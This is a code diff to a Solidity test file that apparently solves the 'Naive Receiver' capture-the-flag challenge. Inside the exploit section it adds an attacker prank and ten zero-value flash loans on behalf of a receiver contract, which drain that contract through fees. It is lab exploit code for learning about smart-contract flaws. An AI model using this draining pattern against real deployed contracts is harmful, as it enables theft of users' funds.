@@ -49,6 +49,18 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
